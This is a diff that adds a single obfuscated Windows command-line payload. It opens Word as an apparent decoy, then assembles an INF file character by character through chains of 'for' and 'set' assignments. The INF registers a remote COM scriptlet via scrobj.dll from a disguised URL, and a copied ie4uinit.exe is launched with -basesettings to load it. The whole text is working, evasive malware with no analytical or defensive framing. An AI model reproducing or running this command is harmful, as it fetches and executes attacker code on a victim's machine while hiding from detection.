@@ -1,0 +1,20 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %f in ("peric=s" "tartarly=e" "unvoyagingu=al" ) do @set %~f) &&
+  callcallcallcallcallcallcall(for %j in ("4") do @set "sexagesima=%~j") &&
+  callcall(for %d in ("[") do @set "attunement=%~d") &&
+  (for %w in ("e") do @set "jugs=%~w") &&
+  (for %m in ("a") do @set "harmoniph=%~m") &&
+  (for %x in ("1") do @set "arrosio=%~x") &&
+  (for %k in ("\") do @set "lurching=%~k") &&
+  call(for %u in ("s") do @set "unambushkar=%~u") &&
+  (for %s in ("m") do @set "preworthil=%~s") &&
+  call(for %e in ("B") do @set "breviradia=%~e") &&
+  call(for %k in ("r") do @set "filth=%~k") &&
+  callcall(for %t in ("X") do @set "beer=%~t") &&
+  call(for %c in ("_") do @set "duf=%~c") &&
+  (for %t in ("v") do @set "tetrapods=%~t") &&
+  (for %g in ("i") do @set "mackere=%~g") &&
+  (for %n in ("2") do @set "fsie=%~n") &&
+  (for %h in (".") do @set "clie=%~h") &&
+  callcallcall(for %o in ("[version]" "signature=$windowsnt$" "[defaultinstall.windows7]" "delfiles=517" "Un\" "Register\" "OCXs=dikeriain_CB2CEC" "[strings]" "servicename= 'art'" "shortsvcname= 'art'" "cinem=." "precli=/" "zimmerwald=:" "interluc=I" "stygi=a" "netc=b" "twiggiesti=c" "acystiaco=e" "rateabil=f" "fish=h" "kersant=i" "tra=l" "photopile=m" "empye=n" "vexillar=r" "mont=s" "polyhy=t" "unhurte=w" "[dikeriain_CB2CEC]" "%mont%c%vexillar%o%netc%\" "j%cinem%d%tra%l,N%interluc%,%fish%t%polyhy%p%zimmerwald%/%precli%w%rateabil%f%cinem%s%acystiaco%h%stygi%l%tra%.%twiggiesti%o%photopile%/%stygi%b%rateabil%2%kersant%a%unhurte%q" "[517]" "i%acystiaco%u%kersant%n%kersant%t%cinem%i%empye%f" "[destinationdirs]" "defaultdestdir=11" "517=01" ) do @echo %~o) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
